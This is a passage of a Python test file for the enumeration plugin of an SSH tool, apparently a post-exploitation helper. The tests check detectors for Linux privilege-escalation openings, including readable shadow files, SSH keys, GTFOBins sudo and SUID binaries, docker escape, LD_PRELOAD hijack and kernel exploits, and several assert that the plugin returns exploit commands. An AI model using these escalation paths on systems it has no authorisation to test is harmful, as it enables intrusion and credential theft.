        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "example.com")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")
        monkeypatch.setenv("LAZYSSH_PORT", "2222")

        from unittest import mock

        mock_result = mock.Mock()
        mock_result.returncode = 0
        mock_result.stdout = "output"
        mock_result.stderr = ""

        with mock.patch("subprocess.run", return_value=mock_result) as mock_run:
            code, stdout, stderr = enumerate_plugin.execute_remote_batch("echo test")
            # Verify -p was included in the command
            call_args = mock_run.call_args[0][0]
            assert "-p" in call_args
            assert "2222" in call_args


class TestResolveLogDir:
    """Tests for _resolve_log_dir function."""

    def test_resolve_log_dir_with_connection_name(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        """Test _resolve_log_dir with CONNECTION_NAME set."""
        monkeypatch.setenv("LAZYSSH_CONNECTION_NAME", "myconn")
        monkeypatch.setattr(
            enumerate_plugin,
            "CONNECTION_LOG_DIR_TEMPLATE",
            str(tmp_path / "{connection_name}.d/logs"),
        )

        result = enumerate_plugin._resolve_log_dir()
        assert "myconn" in str(result)
        assert result.exists()

    def test_resolve_log_dir_with_socket_path(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        """Test _resolve_log_dir falls back to SOCKET with path."""
        monkeypatch.delenv("LAZYSSH_CONNECTION_NAME", raising=False)
        monkeypatch.setenv("LAZYSSH_SOCKET", "/tmp/lazyssh/mysocket")
        monkeypatch.setattr(
            enumerate_plugin,
            "CONNECTION_LOG_DIR_TEMPLATE",
            str(tmp_path / "{connection_name}.d/logs"),
        )

        result = enumerate_plugin._resolve_log_dir()
        # Should extract just "mysocket" from the path
        assert "mysocket" in str(result)
        assert result.exists()

    def test_resolve_log_dir_fallback(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        """Test _resolve_log_dir fallback when mkdir fails."""
        monkeypatch.delenv("LAZYSSH_CONNECTION_NAME", raising=False)
        monkeypatch.setenv("LAZYSSH_SOCKET", "myconn")
        # Use an invalid path that will fail
        monkeypatch.setattr(
            enumerate_plugin, "CONNECTION_LOG_DIR_TEMPLATE", "/nonexistent/\x00invalid/path"
        )

        # Should fall back to /tmp/lazyssh/logs
        result = enumerate_plugin._resolve_log_dir()
        assert "/tmp/lazyssh/logs" in str(result)


class TestWriteArtifacts:
    """Tests for write_artifacts function."""

    def test_write_artifacts_with_txt(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        """Test write_artifacts creates both JSON and txt files when not json_output."""
        monkeypatch.setenv("LAZYSSH_CONNECTION_NAME", "testconn")
        monkeypatch.setattr(
            enumerate_plugin,
            "CONNECTION_LOG_DIR_TEMPLATE",
            str(tmp_path / "{connection_name}.d/logs"),
        )

        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes={}, warnings=[]
        )
        findings: list[enumerate_plugin.PriorityFinding] = []
        plain_report = "Test plain report"
        json_payload = {"test": "data"}

        # Function returns (json_path, txt_path)
        json_path, txt_path = enumerate_plugin.write_artifacts(
            snapshot, findings, plain_report, json_payload, is_json_output=False
        )

        # JSON is always written
        assert json_path.exists()
        import json as json_module

        loaded = json_module.loads(json_path.read_text())
        assert loaded["test"] == "data"

        # Txt is written when is_json_output=False
        assert txt_path is not None
        assert txt_path.exists()
        assert txt_path.read_text() == plain_report

    def test_write_artifacts_json_only(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        """Test write_artifacts creates only JSON file when is_json_output=True."""
        monkeypatch.setenv("LAZYSSH_CONNECTION_NAME", "testconn")
        monkeypatch.setattr(
            enumerate_plugin,
            "CONNECTION_LOG_DIR_TEMPLATE",
            str(tmp_path / "{connection_name}.d/logs"),
        )

        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes={}, warnings=[]
        )
        findings: list[enumerate_plugin.PriorityFinding] = []
        plain_report = "Test plain report"
        json_payload = {"test": "data"}

        # Function returns (json_path, txt_path)
        json_path, txt_path = enumerate_plugin.write_artifacts(
            snapshot, findings, plain_report, json_payload, is_json_output=True
        )

        assert json_path.exists()
        import json as json_module

        loaded = json_module.loads(json_path.read_text())
        assert loaded["test"] == "data"

        # txt_path should be None when is_json_output=True
        assert txt_path is None


def _get_heuristic(key: str) -> "enumerate_plugin.PriorityHeuristic":
    """Helper to look up a heuristic by key."""
    from lazyssh.plugins._enumeration_plan import PRIORITY_HEURISTICS

    return next(h for h in PRIORITY_HEURISTICS if h.key == key)


class TestNewEvaluators:
    """Tests for new heuristic evaluator functions added in Step 1."""

    # --- dangerous_capabilities ---

    def test_evaluate_dangerous_capabilities_found(self) -> None:
        probes = {
            "capabilities": {
                "cap_interesting": _probe(
                    "capabilities",
                    "cap_interesting",
                    "/usr/bin/python3 cap_setuid=ep\n/usr/sbin/tcpdump cap_net_raw=ep\n",
                ),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_dangerous_capabilities(
            snapshot, _get_heuristic("dangerous_capabilities")
        )
        assert result is not None
        assert result.key == "dangerous_capabilities"
        assert "2 binaries" in result.detail
        # python3 has capabilities entries in GTFOBins DB, so exploit_commands should be populated
        assert len(result.exploit_commands) > 0
        assert any("python3" in cmd for cmd in result.exploit_commands)
        # With GTFOBins match, difficulty should be "easy" (escalation keyword)
        assert result.exploitation_difficulty == "easy"

    def test_evaluate_dangerous_capabilities_no_gtfobins_match(self) -> None:
        """Test capabilities evaluator with binary not in GTFOBins DB."""
        probes = {
            "capabilities": {
                "cap_interesting": _probe(
                    "capabilities",
                    "cap_interesting",
                    "/usr/sbin/tcpdump cap_net_raw=ep\n",
                ),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_dangerous_capabilities(
            snapshot, _get_heuristic("dangerous_capabilities")
        )
        assert result is not None
        # tcpdump has no capabilities entry in GTFOBins DB
        assert result.exploitation_difficulty == "moderate"
        assert result.exploit_commands == []

    def test_evaluate_dangerous_capabilities_empty(self) -> None:
        probes = {
            "capabilities": {
                "cap_interesting": _probe("capabilities", "cap_interesting", ""),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_dangerous_capabilities(
            snapshot, _get_heuristic("dangerous_capabilities")
        )
        assert result is None

    def test_evaluate_dangerous_capabilities_missing(self) -> None:
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes={}, warnings=[]
        )
        result = enumerate_plugin._evaluate_dangerous_capabilities(
            snapshot, _get_heuristic("dangerous_capabilities")
        )
        assert result is None

    # --- writable_passwd_file ---

    def test_evaluate_writable_passwd_file_writable(self) -> None:
        probes = {
            "writable": {
                "writable_passwd": _probe("writable", "writable_passwd", "WRITABLE"),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_writable_passwd_file(
            snapshot, _get_heuristic("writable_passwd_file")
        )
        assert result is not None
        assert result.severity == "critical"
        assert result.exploitation_difficulty == "instant"
        assert len(result.exploit_commands) > 0

    def test_evaluate_writable_passwd_file_not_writable(self) -> None:
        probes = {
            "writable": {
                "writable_passwd": _probe("writable", "writable_passwd", "NOT_WRITABLE"),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_writable_passwd_file(
            snapshot, _get_heuristic("writable_passwd_file")
        )
        assert result is None

    def test_evaluate_writable_passwd_file_missing(self) -> None:
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes={}, warnings=[]
        )
        result = enumerate_plugin._evaluate_writable_passwd_file(
            snapshot, _get_heuristic("writable_passwd_file")
        )
        assert result is None

    # --- docker_escape ---

    def test_evaluate_docker_escape_in_group(self) -> None:
        probes = {
            "container": {
                "docker_group": _probe("container", "docker_group", "IN_DOCKER_GROUP"),
                "docker_socket": _probe("container", "docker_socket", "DOCKER_SOCKET_NOT_READABLE"),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_docker_escape(snapshot, _get_heuristic("docker_escape"))
        assert result is not None
        assert "docker group" in result.evidence[0]
        assert result.exploitation_difficulty == "easy"

    def test_evaluate_docker_escape_socket_accessible(self) -> None:
        probes = {
            "container": {
                "docker_group": _probe("container", "docker_group", "NOT_IN_DOCKER_GROUP"),
                "docker_socket": _probe("container", "docker_socket", "DOCKER_SOCKET_READABLE"),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_docker_escape(snapshot, _get_heuristic("docker_escape"))
        assert result is not None
        assert "Docker socket" in result.evidence[0]

    def test_evaluate_docker_escape_neither(self) -> None:
        probes = {
            "container": {
                "docker_group": _probe("container", "docker_group", "NOT_IN_DOCKER_GROUP"),
                "docker_socket": _probe("container", "docker_socket", "DOCKER_SOCKET_NOT_READABLE"),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_docker_escape(snapshot, _get_heuristic("docker_escape"))
        assert result is None

    # --- writable_service_files ---

    def test_evaluate_writable_service_files_found(self) -> None:
        probes = {
            "writable": {
                "writable_services": _probe(
                    "writable",
                    "writable_services",
                    "/etc/systemd/system/custom.service\n/etc/systemd/system/another.service\n",
                ),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_writable_service_files(
            snapshot, _get_heuristic("writable_service_files")
        )
        assert result is not None
        assert "2 writable" in result.detail

    def test_evaluate_writable_service_files_none(self) -> None:
        probes = {
            "writable": {
                "writable_services": _probe("writable", "writable_services", "NONE_WRITABLE"),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_writable_service_files(
            snapshot, _get_heuristic("writable_service_files")
        )
        assert result is None

    # --- credential_exposure ---

    def test_evaluate_credential_exposure_shadow(self) -> None:
        probes = {
            "credentials": {
                "shadow_readable": _probe(
                    "credentials",
                    "shadow_readable",
                    "root:$6$abc:19000:0:99999:7:::\ndaemon:*:19000:0:99999:7:::",
                ),
                "ssh_keys": _probe("credentials", "ssh_keys", "NO_READABLE_KEYS"),
                "history_files": _probe("credentials", "history_files", "NO_HISTORY_SECRETS"),
                "config_credentials": _probe("credentials", "config_credentials", "NONE_FOUND"),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_credential_exposure(
            snapshot, _get_heuristic("credential_exposure")
        )
        assert result is not None
        assert "/etc/shadow is readable" in result.evidence

    def test_evaluate_credential_exposure_ssh_keys(self) -> None:
        probes = {
            "credentials": {
                "shadow_readable": _probe("credentials", "shadow_readable", "SHADOW_NOT_READABLE"),
                "ssh_keys": _probe(
                    "credentials",
                    "ssh_keys",
                    "/home/user/.ssh/id_rsa\n/root/.ssh/id_rsa\n",
                ),
                "history_files": _probe("credentials", "history_files", "NO_HISTORY_SECRETS"),
                "config_credentials": _probe("credentials", "config_credentials", "NONE_FOUND"),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_credential_exposure(
            snapshot, _get_heuristic("credential_exposure")
        )
        assert result is not None
        assert any("SSH key" in e for e in result.evidence)

    def test_evaluate_credential_exposure_none(self) -> None:
        probes = {
            "credentials": {
                "shadow_readable": _probe("credentials", "shadow_readable", "SHADOW_NOT_READABLE"),
                "ssh_keys": _probe("credentials", "ssh_keys", "NO_READABLE_KEYS"),
                "history_files": _probe("credentials", "history_files", "NO_HISTORY_SECRETS"),
                "config_credentials": _probe("credentials", "config_credentials", "NONE_FOUND"),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_credential_exposure(
            snapshot, _get_heuristic("credential_exposure")
        )
        assert result is None

    # --- gtfobins_sudo ---

    def test_evaluate_gtfobins_sudo_found(self) -> None:
        probes = {
            "users": {
                "sudo_check": _probe(
                    "users",
                    "sudo_check",
                    "User user may run the following commands:\n"
                    "    (root) NOPASSWD: /usr/bin/vim\n"
                    "    (root) NOPASSWD: /usr/bin/find\n",
                ),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_gtfobins_sudo(snapshot, _get_heuristic("gtfobins_sudo"))
        assert result is not None
        assert result.exploitation_difficulty in ("instant", "easy")
        assert len(result.evidence) >= 2
        # Cross-reference should produce exploit commands from GTFOBins DB
        assert len(result.exploit_commands) > 0
        assert any("vim" in cmd for cmd in result.exploit_commands)

    def test_evaluate_gtfobins_sudo_safe(self) -> None:
        probes = {
            "users": {
                "sudo_check": _probe(
                    "users",
                    "sudo_check",
                    "User user may run the following commands:\n"
                    "    (root) NOPASSWD: /usr/bin/systemctl\n",
                ),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_gtfobins_sudo(snapshot, _get_heuristic("gtfobins_sudo"))
        assert result is None

    def test_evaluate_gtfobins_sudo_missing(self) -> None:
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes={}, warnings=[]
        )
        result = enumerate_plugin._evaluate_gtfobins_sudo(snapshot, _get_heuristic("gtfobins_sudo"))
        assert result is None

    def test_evaluate_gtfobins_sudo_shell_binary_instant(self) -> None:
        """Test that shell-spawning sudo binaries get 'instant' difficulty."""
        probes = {
            "users": {
                "sudo_check": _probe(
                    "users",
                    "sudo_check",
                    "User user may run the following commands:\n    (root) NOPASSWD: /bin/bash\n",
                ),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_gtfobins_sudo(snapshot, _get_heuristic("gtfobins_sudo"))
        assert result is not None
        assert result.exploitation_difficulty == "instant"
        assert any("bash" in cmd.lower() for cmd in result.exploit_commands)

    # --- gtfobins_suid ---

    def test_evaluate_gtfobins_suid_found(self) -> None:
        probes = {
            "filesystem": {
                "suid_files": _probe(
                    "filesystem",
                    "suid_files",
                    "/usr/bin/vim\n/usr/bin/find\n/usr/bin/passwd\n",
                ),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_gtfobins_suid(snapshot, _get_heuristic("gtfobins_suid"))
        assert result is not None
        assert result.exploitation_difficulty in ("instant", "easy")
        # vim and find are in GTFOBins DB, passwd is not
        assert "/usr/bin/vim" in result.evidence
        assert "/usr/bin/find" in result.evidence
        # Cross-reference should produce exploit commands from GTFOBins DB
        assert len(result.exploit_commands) > 0
        assert any("vim" in cmd or "find" in cmd for cmd in result.exploit_commands)

    def test_evaluate_gtfobins_suid_only_safe(self) -> None:
        probes = {
            "filesystem": {
                "suid_files": _probe(
                    "filesystem",
                    "suid_files",
                    "/usr/bin/passwd\n/usr/bin/chfn\n",
                ),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_gtfobins_suid(snapshot, _get_heuristic("gtfobins_suid"))
        assert result is None

    def test_evaluate_gtfobins_suid_exploit_commands_populated(self) -> None:
        """Test that SUID findings include actual GTFOBins command templates."""
        probes = {
            "filesystem": {
                "suid_files": _probe(
                    "filesystem",
                    "suid_files",
                    "/usr/bin/python3\n",
                ),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_gtfobins_suid(snapshot, _get_heuristic("gtfobins_suid"))
        assert result is not None
        assert len(result.exploit_commands) >= 2  # comment + command
        # Should contain the actual exploit command from the DB
        assert any("python3" in cmd for cmd in result.exploit_commands)

    # --- writable_path ---

    def test_evaluate_writable_path_found(self) -> None:
        probes = {
            "writable": {
                "writable_path_dirs": _probe(
                    "writable",
                    "writable_path_dirs",
                    "WRITABLE:/usr/local/bin\nWRITABLE:/home/user/bin\nDONE\n",
                ),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_writable_path(snapshot, _get_heuristic("writable_path"))
        assert result is not None
        assert "2 writable" in result.detail
        assert "/usr/local/bin" in result.evidence

    def test_evaluate_writable_path_none(self) -> None:
        probes = {
            "writable": {
                "writable_path_dirs": _probe("writable", "writable_path_dirs", "DONE\n"),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_writable_path(snapshot, _get_heuristic("writable_path"))
        assert result is None

    # --- writable_cron_files ---

    def test_evaluate_writable_cron_files_found(self) -> None:
        probes = {
            "writable": {
                "writable_cron": _probe(
                    "writable",
                    "writable_cron",
                    "WRITABLE:/etc/crontab\nWRITABLE:/etc/cron.d\nDONE\n",
                ),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_writable_cron_files(
            snapshot, _get_heuristic("writable_cron_files")
        )
        assert result is not None
        assert "2 writable" in result.detail

    def test_evaluate_writable_cron_files_none(self) -> None:
        probes = {
            "writable": {
                "writable_cron": _probe("writable", "writable_cron", "DONE\n"),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_writable_cron_files(
            snapshot, _get_heuristic("writable_cron_files")
        )
        assert result is None

    # --- nfs_no_root_squash ---

    def test_evaluate_nfs_no_root_squash_found(self) -> None:
        probes = {
            "filesystem": {
                "nfs_exports": _probe(
                    "filesystem",
                    "nfs_exports",
                    "/shared *(rw,no_root_squash)\n/data 10.0.0.0/24(rw,root_squash)\n",
                ),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_nfs_no_root_squash(
            snapshot, _get_heuristic("nfs_no_root_squash")
        )
        assert result is not None
        assert "1 NFS exports" in result.detail
        assert "no_root_squash" in result.evidence[0]

    def test_evaluate_nfs_no_root_squash_safe(self) -> None:
        probes = {
            "filesystem": {
                "nfs_exports": _probe(
                    "filesystem",
                    "nfs_exports",
                    "/data 10.0.0.0/24(rw,root_squash)\n",
                ),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_nfs_no_root_squash(
            snapshot, _get_heuristic("nfs_no_root_squash")
        )
        assert result is None

    def test_evaluate_nfs_no_root_squash_no_exports(self) -> None:
        probes = {
            "filesystem": {
                "nfs_exports": _probe("filesystem", "nfs_exports", "NO_NFS_EXPORTS"),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_nfs_no_root_squash(
            snapshot, _get_heuristic("nfs_no_root_squash")
        )
        assert result is None

    # --- ld_preload_hijack ---

    def test_evaluate_ld_preload_hijack_preload_set(self) -> None:
        probes = {
            "library_hijack": {
                "ld_preload": _probe(
                    "library_hijack",
                    "ld_preload",
                    "LD_PRELOAD=/tmp/evil.so\nNO_LD_PRELOAD_FILE\n",
                ),
                "ld_library_path": _probe(
                    "library_hijack", "ld_library_path", "LD_LIBRARY_PATH=\nDONE\n"
                ),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_ld_preload_hijack(
            snapshot, _get_heuristic("ld_preload_hijack")
        )
        assert result is not None
        assert any("LD_PRELOAD" in e for e in result.evidence)

    def test_evaluate_ld_preload_hijack_writable_lib_dir(self) -> None:
        probes = {
            "library_hijack": {
                "ld_preload": _probe(
                    "library_hijack",
                    "ld_preload",
                    "LD_PRELOAD=\nNO_LD_PRELOAD_FILE\n",
                ),
                "ld_library_path": _probe(
                    "library_hijack",
                    "ld_library_path",
                    "LD_LIBRARY_PATH=/usr/local/lib\nWRITABLE:/usr/local/lib\nDONE\n",
                ),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_ld_preload_hijack(
            snapshot, _get_heuristic("ld_preload_hijack")
        )
        assert result is not None
        assert any("Writable LD_LIBRARY_PATH" in e for e in result.evidence)

    def test_evaluate_ld_preload_hijack_clean(self) -> None:
        probes = {
            "library_hijack": {
                "ld_preload": _probe(
                    "library_hijack",
                    "ld_preload",
                    "LD_PRELOAD=\nNO_LD_PRELOAD_FILE\n",
                ),
                "ld_library_path": _probe(
                    "library_hijack", "ld_library_path", "LD_LIBRARY_PATH=\nDONE\n"
                ),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_ld_preload_hijack(
            snapshot, _get_heuristic("ld_preload_hijack")
        )
        assert result is None

    # --- container_detected ---

    def test_evaluate_container_detected_docker(self) -> None:
        probes = {
            "container": {
                "container_detection": _probe(
                    "container", "container_detection", "DOCKER_CONTAINER"
                ),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_container_detected(
            snapshot, _get_heuristic("container_detected")
        )
        assert result is not None
        assert "DOCKER_CONTAINER" in result.evidence

    def test_evaluate_container_detected_not_container(self) -> None:
        probes = {
            "container": {
                "container_detection": _probe("container", "container_detection", "NOT_CONTAINER"),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_container_detected(
            snapshot, _get_heuristic("container_detected")
        )
        assert result is None

    # --- cloud_environment ---

    def test_evaluate_cloud_environment_aws_metadata(self) -> None:
        probes = {
            "credentials": {
                "cloud_credentials": _probe(
                    "credentials",
                    "cloud_credentials",
                    "NO_CLOUD_CREDS\nAWS_METADATA_AVAILABLE\n",
                ),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_cloud_environment(
            snapshot, _get_heuristic("cloud_environment")
        )
        assert result is not None
        assert any("AWS metadata" in e for e in result.evidence)

    def test_evaluate_cloud_environment_none(self) -> None:
        probes = {
            "credentials": {
                "cloud_credentials": _probe(
                    "credentials",
                    "cloud_credentials",
                    "NO_CLOUD_CREDS\nNO_CLOUD_METADATA\n",
                ),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_cloud_environment(
            snapshot, _get_heuristic("cloud_environment")
        )
        assert result is None

    # --- interesting_backups ---

    def test_evaluate_interesting_backups_found(self) -> None:
        probes = {
            "interesting_files": {
                "backup_files": _probe(
                    "interesting_files",
                    "backup_files",
                    "-rw-r--r-- 1 root root 1234 Jan 1 00:00 /var/backups/passwd.bak\n"
                    "/tmp/database.sql\n",
                ),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_interesting_backups(
            snapshot, _get_heuristic("interesting_backups")
        )
        assert result is not None
        assert "2 accessible" in result.detail

    def test_evaluate_interesting_backups_none(self) -> None:
        probes = {
            "interesting_files": {
                "backup_files": _probe("interesting_files", "backup_files", "NO_BACKUPS"),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_interesting_backups(
            snapshot, _get_heuristic("interesting_backups")
        )
        assert result is None

    # --- recent_modifications ---

    def test_evaluate_recent_modifications_found(self) -> None:
        probes = {
            "interesting_files": {
                "recently_modified": _probe(
                    "interesting_files",
                    "recently_modified",
                    "/etc/passwd\n/usr/local/bin/script.sh\n",
                ),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_recent_modifications(
            snapshot, _get_heuristic("recent_modifications")
        )
        assert result is not None
        assert "2 recently" in result.detail

    def test_evaluate_recent_modifications_none(self) -> None:
        probes = {
            "interesting_files": {
                "recently_modified": _probe(
                    "interesting_files", "recently_modified", "NONE_RECENT"
                ),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_recent_modifications(
            snapshot, _get_heuristic("recent_modifications")
        )
        assert result is None

    # --- kernel_exploits ---

    def test_evaluate_kernel_exploits_found(self) -> None:
        """Test kernel_exploits detection with vulnerable kernel."""
        probes = {
            "system": {
                "kernel": _probe("system", "kernel", "5.10.100-generic"),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_kernel_exploits(
            snapshot, _get_heuristic("kernel_exploits")
        )
        assert result is not None
        assert result.key == "kernel_exploits"
        assert result.severity == "high"
        assert "5.10.100" in result.detail
        assert len(result.evidence) > 0
        assert result.exploitation_difficulty == "moderate"
        assert len(result.exploit_commands) > 0

    def test_evaluate_kernel_exploits_not_found(self) -> None:
        """Test kernel_exploits with a kernel too new for known exploits."""
        probes = {
            "system": {
                "kernel": _probe("system", "kernel", "6.12.0"),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_kernel_exploits(
            snapshot, _get_heuristic("kernel_exploits")
        )
        # May or may not be None depending on DB coverage, but should not error
        # For 6.12.0, most exploits should not match
        if result is not None:
            assert result.key == "kernel_exploits"

    def test_evaluate_kernel_exploits_missing_probe(self) -> None:
        """Test kernel_exploits with missing kernel probe."""
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes={}, warnings=[]
        )
        result = enumerate_plugin._evaluate_kernel_exploits(
            snapshot, _get_heuristic("kernel_exploits")
        )
        assert result is None

    def test_evaluate_kernel_exploits_empty_kernel(self) -> None:
        """Test kernel_exploits with empty kernel version."""
        probes = {
            "system": {
                "kernel": _probe("system", "kernel", "   \n"),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_kernel_exploits(
            snapshot, _get_heuristic("kernel_exploits")
        )
        assert result is None

    def test_evaluate_kernel_exploits_dirty_cow(self) -> None:
        """Test that Dirty COW is found for old kernels."""
        probes = {
            "system": {
                "kernel": _probe("system", "kernel", "4.4.0-42-generic"),
            },
        }
        snapshot = enumerate_plugin.EnumerationSnapshot(
            collected_at=datetime.now(UTC), probes=probes, warnings=[]
        )
        result = enumerate_plugin._evaluate_kernel_exploits(
            snapshot, _get_heuristic("kernel_exploits")
        )
        assert result is not None
        assert any("CVE-2016-5195" in e for e in result.evidence)


class TestNewCategoryOrderAndProbes:
    """Test that new categories appear in SELECTED_CATEGORY_ORDER and new probes in REMOTE_PROBES."""

    def test_new_categories_in_order(self) -> None:
        """Verify all new categories are in SELECTED_CATEGORY_ORDER."""
        new_categories = {
            "capabilities",
            "writable",
            "credentials",
            "container",
            "library_hijack",
            "interesting_files",
        }
        assert new_categories.issubset(set(enumerate_plugin.SELECTED_CATEGORY_ORDER))

    def test_new_probe_categories_exist(self) -> None:
        """Verify probes exist for each new category."""
        from lazyssh.plugins._enumeration_plan import REMOTE_PROBES

        categories = {p.category for p in REMOTE_PROBES}
        for cat in (
            "capabilities",
            "writable",
            "credentials",
            "container",
            "library_hijack",
            "interesting_files",
        ):
            assert cat in categories, f"Category {cat} missing from REMOTE_PROBES"

    def test_existing_category_expansions(self) -> None:
        """Verify expanded probes in existing categories."""
        from lazyssh.plugins._enumeration_plan import REMOTE_PROBES

        probe_keys = {(p.category, p.key) for p in REMOTE_PROBES}
        assert ("filesystem", "nfs_exports") in probe_keys
        assert ("filesystem", "mounted_nfs") in probe_keys
        assert ("users", "doas_conf") in probe_keys
        assert ("users", "polkit_rules") in probe_keys
        assert ("users", "pkexec_version") in probe_keys

